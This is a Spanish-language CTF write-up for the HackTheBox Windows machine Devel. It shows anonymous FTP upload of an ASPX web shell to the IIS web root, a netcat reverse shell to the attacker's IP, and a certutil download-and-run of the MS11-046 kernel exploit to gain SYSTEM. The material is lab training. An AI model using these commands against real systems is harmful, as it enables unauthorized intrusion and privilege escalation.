---
title: Devel Writeup - HackTheBox
date: 2023-07-23
categories: [Writeups, HTB]
tags: [Linux, HTB, CTF, Easy, IIS, MS11-046]
img_path: /assets/img/commons/devel/
image: devel.png
---

¡Saludos!

En este writeup, nos adentraremos en la máquina [**Devel**](https://app.hackthebox.com/machines/Devel) de **HackTheBox**, la cual está clasificada con un nivel de dificultad fácil según la plataforma. Se trata de una máquina **Windows** en la que realizaremos una **enumeración FTP** utilizando el usuario **"anonymous"**, identificando que los archivos colocados en la raíz del servidor FTP están accesibles a través del servidor web. Aprovechando los permisos de carga de archivos en el servidor FTP, procederemos a cargar una web shell para lograr la ejecución remota de código. Posteriormente, estableceremos una reverse shell para obtener acceso al sistema. Finalmente, identificaremos que esta máquina es vulnerable a **MS11-046**, lo que nos permitirá escalar privilegios.

¡Vamos a empezar!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.10.5
PING 10.10.10.5 (10.10.10.5) 56(84) bytes of data.
64 bytes from 10.10.10.5: icmp_seq=1 ttl=127 time=198 ms

--- 10.10.10.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 197.921/197.921/197.921/0.000 ms
```

Dado que el `TTL` es cercano a 128, podemos inferir que la máquina objetivo probablemente sea Windows.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.10.5 -oG allPorts.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 11:14 -05
Nmap scan report for 10.10.10.5
Host is up (0.13s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.74 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 21,80 -sV -sC --min-rate 5000 10.10.10.5 -oN services.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 11:47 -05
Nmap scan report for 10.10.10.5
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
```

El reporte señala que en la máquina objetivo se encuentran activos dos servicios principales. Por un lado, se identifica un servicio **FTP** (`Microsoft ftpd`) en el puerto predeterminado y, por otro lado, un servicio Web `Microsoft-IIS` en el puerto `80`.

### FTP - 21

Iniciamos enumerando el servicio FTP debido a que el reporte anterior indicaba que el acceso FTP anónimo está permitido.

Iniciamos sesión como usuario `anonymous` sin proporcionar contraseña y listamos los archivos y directorios del servidor.

```bash
❯ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:juanr): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49157|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp>
```

El intento de conexión anónima a través de FTP revela que el servidor parece estar accediendo al directorio predeterminado del servidor IIS.

Podemos confirmarlo descargando la imagen `welcome.png` en nuestro directorio actual de trabajo.

```bash
ftp> binary
200 Type set to I.
ftp> get welcome.png
local: welcome.png remote: welcome.png
229 Entering Extended Passive Mode (|||49163|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************|   180 KiB  236.15 KiB/s    00:00 ETA
226 Transfer complete.
184946 bytes received in 00:00 (236.09 KiB/s)
```

Podemos ver que se trata de esta imagen.

![iis7](iis7.png)

### HTTP - 80

Al acceder al servicio web, nos encontramos con la siguiente página web que contiene la misma imagen almacenada en el servidor FTP.

![web](web.png)

Al intentar acceder directamente a la imagen, podemos confirmar que los archivos colocados en la raíz FTP están disponibles a través del servidor web.

![welcome](welcome.png)

## Explotación

---

### Abusing FTP + IIS Services

Ahora que sabemos que los archivos colocados en la raíz del servidor FTP están accesibles a través del servidor web, podemos intentar subir un archivo “txt” para verificar si podemos acceder a él mediante el navegador.

Creamos un archivo `.txt` con cualquier contenido y lo subimos al servidor.

```bash
ftp> put test.txt 
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49165|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************|    16      229.77 KiB/s    --:-- ETA
226 Transfer complete.
16 bytes sent in 00:00 (0.14 KiB/s)
```

Posteriormente, accedemos a él a través del navegador web.

![test](test.png)

Dado que tenemos la capacidad de cargar archivos en el servidor FTP, podemos subir una web shell `.aspx` que nos permita ejecución remota de comandos para luego generar una reverse shell.

En este caso, utilizamos la web shell ubicada en la ruta de Kali: `/usr/share/davtest/backdoors/aspx_cmd.aspx`, y lo cargamos en el servidor FTP.

```bash
ftp> put aspx_cmd.aspx 
local: aspx_cmd.aspx remote: aspx_cmd.aspx
229 Entering Extended Passive Mode (|||49168|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************|  1438       16.32 MiB/s    --:-- ETA
226 Transfer complete.
1438 bytes sent in 00:00 (13.12 KiB/s)
```

Después, accedemos a `http://10.10.10.5/aspx_cmd.aspx` y entramos a la web shell. Ejecutamos el comando `whoami` para verificar el usuario actual.

![web_shell](web_shell.png)

El siguiente paso es cargar el ejecutable `nc.exe` en el servidor FTP y utilizarlo para establecer la reverse shell.

Para ello, utilizamos el archivo `nc.exe` ubicado en la ruta de Kali: `/usr/share/windows-resources/binaries/nc.exe` y lo subimos al servidor FTP.

```bash
ftp> binary
200 Type set to I.
ftp> put nc.exe 
local: nc.exe remote: nc.exe
229 Entering Extended Passive Mode (|||49206|)
150 Opening BINARY mode data connection.
100% |*****************************************************************************************************************************************| 59392       82.52 KiB/s    00:00 ETA
226 Transfer complete.
59392 bytes sent in 00:00 (71.55 KiB/s)
```

En este caso, los archivos cargados al servidor FTP se almacenan en la ruta por defecto del IIS: `c:\inetpub\wwwroot`. Para verificarlos, usamos el comando `dir c:\inetpub\wwwroot` y así observamos todos los archivos cargados.

![web_shell2](web_shell2.png)

Iniciamos la escucha en nuestra máquina atacante y ejecutamos `nc.exe` para generar una reverse shell con el siguiente comando: `c:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.108 443`. Si todo va bien, obtendremos una shell con el usuario `iis apppool\web`.

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.108] from (UNKNOWN) [10.10.10.5] 49207
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

Si tratamos de acceder al directorio del usuario `babis`, notaremos que no tenemos los permisos necesarios. Por lo tanto, para acceder a las flags de la máquina, debemos elevarnos a usuario `nt authority\system`.

```bash
c:\Users>cd babis
cd babis
Access is denied.
```

## Escalación de privilegios

---

Al ejecutar el comando `systeminfo` para obtener información de la máquina, obtendremos los siguientes detalles del sistema:

```bash
c:\Users>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 
System Boot Time:          23/7/2023, 7:31:18 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.

[...]
```

### Microsoft Windows (x86) – ‘afd.sys’ (MS11-046)

Tras observar que la versión del sistema operativo es antigua, buscamos posibles exploits conocidos en Google y encontramos la vulnerabilidad **MS11-046**.

En este caso, utilizamos el exploit alojado en el repositorio de GitHub: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046

Según el repositorio, el modo de uso es sencillo: solo debemos ejecutar el archivo `MS11-046.exe` para obtener una shell como `nt authority\system`.

Así que comenzamos alojando el archivo `MS11-046.exe` en un servidor simple usando Python.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

En la máquina víctima, nos dirigimos al directorio `c:\windows\temp` y descargamos el archivo.

```bash
c:\Users>cd c:\windows\temp
cd c:\windows\temp

c:\Windows\Temp>certutil -urlcache -f http://10.10.14.108/ms11-046.exe ms11-046.exe
certutil -urlcache -f http://10.10.14.108/ms11-046.exe ms11-046.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Una vez descargado, simplemente ejecutamos `MS11-046.exe` y obtendremos una shell como `nt authority\system`.

```bash
c:\Windows\Temp>MS11-046.exe
MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

Finalmente, al tener acceso como `nt authority\system`, podemos leer las flags de la máquina alojadas en las rutas habituales.

```bash
c:\Users>type c:\Users\babis\Desktop\user.txt
type c:\Users\babis\Desktop\user.txt
33cc762964d9c12d***************

c:\Users>type c:\Users\Administrator\Desktop\root.txt
type c:\Users\Administrator\Desktop\root.txt
3336cfddafee62ed***************
```

!Happy Hacking¡
